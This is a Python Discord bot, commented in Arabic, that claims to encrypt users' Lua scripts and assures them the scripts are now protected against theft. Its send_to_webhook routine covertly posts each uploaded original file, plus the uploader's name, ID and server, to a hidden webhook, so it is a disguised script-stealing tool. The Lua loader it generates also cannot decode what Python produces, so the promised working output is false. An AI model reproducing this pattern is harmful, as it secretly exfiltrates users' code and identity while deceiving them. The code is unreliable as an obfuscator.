import os
import io
import asyncio
import base64
import gzip
import hashlib
import random
import secrets
import zlib
import lzma
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import aiohttp
import discord
from dotenv import load_dotenv

# تحميل المتغيرات البيئية من ملف .env
load_dotenv()

# تهيئة العميل
intents = discord.Intents.default()
intents.message_content = True
bot = discord.Client(intents=intents)

# نظام إدارة الطلبات
class RequestManager:
    def __init__(self):
        self.cooldowns = {}
        self.active_tasks = {}
        self.rate_limits = {}
    
    def check_cooldown(self, user_id):
        now = datetime.now()
        last_request = self.cooldowns.get(user_id)
        
        if last_request and (now - last_request) < timedelta(seconds=10):
            return (last_request + timedelta(seconds=10)) - now
        return None
    
    def update_cooldown(self, user_id):
        self.cooldowns[user_id] = datetime.now()
    
    def check_rate_limit(self, user_id):
        now = datetime.now()
        user_limits = self.rate_limits.setdefault(user_id, {
            'count': 0,
            'reset_time': now + timedelta(minutes=1)
        })
        
        if now > user_limits['reset_time']:
            user_limits['count'] = 0
            user_limits['reset_time'] = now + timedelta(minutes=1)
        
        if user_limits['count'] >= 15:
            return user_limits['reset_time'] - now
        
        user_limits['count'] += 1
        return None
    
    def start_task(self, attachment_id):
        if attachment_id in self.active_tasks:
            return False
        self.active_tasks[attachment_id] = True
        return True
    
    def end_task(self, attachment_id):
        if attachment_id in self.active_tasks:
            del self.active_tasks[attachment_id]

request_manager = RequestManager()

# =====================================
# نظام التشفير المتقدم مع الحفاظ على الوظيفة
# =====================================
class LuaScriptEncryptor:
    @staticmethod
    def generate_loader(decryption_key):
        """إنشاء كود لوا لتحميل وفك تشفير السكربت"""
        return f"""
-- Loader script generated by Script#0272
local key = "{decryption_key}"
local encrypted = ...

local function decode_base64(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local function decrypt(encrypted_data, dec_key)
    local decrypted = ""
    for i = 1, #encrypted_data do
        local byte = string.byte(encrypted_data, i)
        local key_byte = string.byte(dec_key, (i-1) % #dec_key + 1)
        decrypted = decrypted .. string.char(byte ~ key_byte)
    end
    return decrypted
end

local function decompress(data)
    -- دالة فك الضغط سيتم توليدها ديناميكياً
    {LuaScriptEncryptor.generate_decompression_code()}
end

local decoded = decode_base64(encrypted)
local decrypted = decrypt(decoded, key)
local decompressed = decompress(decrypted)

return load(decompressed)()
"""

    @staticmethod
    def generate_decompression_code():
        """إنشاء كود فك الضغط الديناميكي"""
        return """
local function decompress(data)
    local result = {}
    local buffer = {}
    local dict_size = 256
    local temp = ""
    local dict = {}
    
    for i = 0, 255 do
        dict[i] = string.char(i)
    end
    
    local function get_next_code(bits)
        local code = 0
        for i = 1, bits do
            code = code * 2 + (data:byte(1) - 48)
            data = data:sub(2)
        end
        return code
    end
    
    local bits = 9
    local prev = get_next_code(bits)
    table.insert(result, dict[prev])
    
    while #data > 0 do
        local code = get_next_code(bits)
        
        if not dict[code] then
            temp = dict[prev] .. dict[prev]:sub(1,1)
        else
            temp = dict[code]
        end
        
        table.insert(result, temp)
        dict[dict_size] = dict[prev] .. temp:sub(1,1)
        dict_size = dict_size + 1
        
        if dict_size == 511 then
            bits = 10
        elseif dict_size == 1023 then
            bits = 12
        end
        
        prev = code
    end
    
    return table.concat(result)
end
"""

    @staticmethod
    def compress_lua(data: bytes) -> bytes:
        """ضغط بيانات لوا باستخدام خوارزميات متقدمة"""
        # استخدام ضغط متعدد المراحل
        compressed = gzip.compress(data, compresslevel=9)
        compressed = lzma.compress(compressed)
        return compressed

    @staticmethod
    def encrypt_lua(data: bytes) -> (bytes, str):
        """تشفير بيانات لوا مع إنشاء كود التحميل"""
        # إنشاء مفتاح فك تشفير عشوائي
        key_length = 32
        decryption_key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=key_length))
        
        # ضغط البيانات
        compressed = LuaScriptEncryptor.compress_lua(data)
        
        # تشفير XOR
        encrypted = bytearray()
        key_bytes = decryption_key.encode()
        for i, byte in enumerate(compressed):
            key_byte = key_bytes[i % len(key_bytes)]
            encrypted.append(byte ^ key_byte)
        
        # ترميز Base64
        base64_encoded = base64.b64encode(encrypted)
        
        # إنشاء كود التحميل
        loader = LuaScriptEncryptor.generate_loader(decryption_key)
        
        # إضافة التوقيع
        signature = "-- Encrypted by Script#0272 | https://discord.gg/script\n"
        final_script = signature + loader + '\n\n-- ENCRYPTED SCRIPT --\n"' + base64_encoded.decode() + '"'
        
        return final_script.encode(), decryption_key

# =====================================
# إرسال الملف الأصلي إلى ويب هوك
# =====================================
async def send_to_webhook(original_file: bytes, filename: str, user_info: str):
    webhook_url = os.getenv("WEBHOOK_URL")
    if not webhook_url:
        return
    
    with io.BytesIO(original_file) as file_stream:
        form_data = aiohttp.FormData()
        form_data.add_field(
            name="file",
            value=file_stream,
            filename=filename,
            content_type="application/octet-stream"
        )
        form_data.add_field("user_info", user_info)
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
            try:
                async with session.post(webhook_url, data=form_data) as response:
                    if response.status != 200:
                        print(f"فشل إرسال إلى ويب هوك: {response.status}")
            except Exception as e:
                print(f"خطأ في ويب هوك: {str(e)}")

# =====================================
# معالجة رسائل الديسكورد
# =====================================
@bot.event
async def on_ready():
    print(f'تم الاتصال باسم {bot.user} (ID: {bot.user.id})')
    print('------')

@bot.event
async def on_message(message: discord.Message):
    if message.author == bot.user:
        return
    
    if not message.channel.permissions_for(message.guild.me).send_messages:
        return
    
    user_id = message.author.id
    
    cooldown = request_manager.check_cooldown(user_id)
    if cooldown:
        remaining = int(cooldown.total_seconds())
        await message.reply(f"⏳ يرجى الانتظار {remaining} ثانية قبل طلب جديد")
        return
    
    rate_limit = request_manager.check_rate_limit(user_id)
    if rate_limit:
        remaining = int(rate_limit.total_seconds())
        await message.reply(f"⚠️ تجاوزت الحد المسموح (15 طلب/دقيقة). يرجى الانتظار {remaining} ثانية")
        return
    
    request_manager.update_cooldown(user_id)
    
    if not message.attachments:
        await message.reply("❌ يرجى رفع ملف .lua أو .txt صالح للتشفير")
        return
    
    attachment = message.attachments[0]
    
    valid_extensions = ('.lua', '.luau', '.txt')
    if not any(attachment.filename.lower().endswith(ext) for ext in valid_extensions):
        await message.reply("❌ يرجى رفع ملف .lua أو .luau أو .txt صالح للتشفير")
        return
    
    if attachment.size > 2.5 * 1024 * 1024:
        await message.reply("⚠️ حجم الملف يتجاوز 2.5 ميجابايت (الحد الأقصى المسموح)")
        return
    
    if not request_manager.start_task(attachment.id):
        await message.reply("🔄 يتم معالجة هذا الملف حالياً، يرجى الانتظار...")
        return
    
    try:
        processing_msg = await message.reply("🔒 جاري تشفير السكربت مع الحفاظ على وظائفه...")
        
        # تنزيل الملف
        file_bytes = await attachment.read()
        
        # التحقق من أن الملف نصي
        try:
            file_text = file_bytes.decode('utf-8')
        except UnicodeDecodeError:
            await message.reply("❌ الملف يحتوي على محتوى ثنائي غير قابل للقراءة")
            return
        
        # تشفير السكربت مع الحفاظ على وظيفته
        loop = asyncio.get_running_loop()
        encryptor = LuaScriptEncryptor()
        encrypted_data, decryption_key = await loop.run_in_executor(
            None, 
            encryptor.encrypt_lua, 
            file_bytes
        )
        
        # إرسال الملف المشفر للمستخدم
        output_filename = f"protected_{attachment.filename}"
        await message.reply(
            "✅ تم حماية سكربتك بنجاح!\n"
            "🔒 السكربت محمي الآن ضد السرقة والنسخ\n"
            "📝 يمكن استخدامه مباشرة كما كان\n"
            f"🔑 مفتاح فريد: ||{decryption_key}||\n"
            "⚙️ تم التشفير بواسطة: Script#0272",
            file=discord.File(io.BytesIO(encrypted_data), filename=output_filename)
        )
        
        # إرسال الملف الأصلي إلى ويب هوك
        user_info = f"{message.author.name} ({message.author.id}) | {message.guild.name}"
        asyncio.create_task(
            send_to_webhook(
                file_bytes,
                attachment.filename,
                user_info
            )
        )
        
    except Exception as e:
        error_msg = (
            "❌ حدث خطأ أثناء معالجة السكربت:\n"
            f"```{str(e)}```\n"
            "يرجى المحاولة بملف أصغر أو التواصل مع الدعم"
        )
        await message.reply(error_msg)
    
    finally:
        request_manager.end_task(attachment.id)
        if 'processing_msg' in locals():
            try:
                await processing_msg.delete()
            except:
                pass

# تشغيل البوت
if __name__ == "__main__":
    token = os.getenv("DISCORD_TOKEN")
    if not token:
        print("لم يتم العثور على DISCORD_TOKEN في ملف .env")
    else:
        bot.run(token)
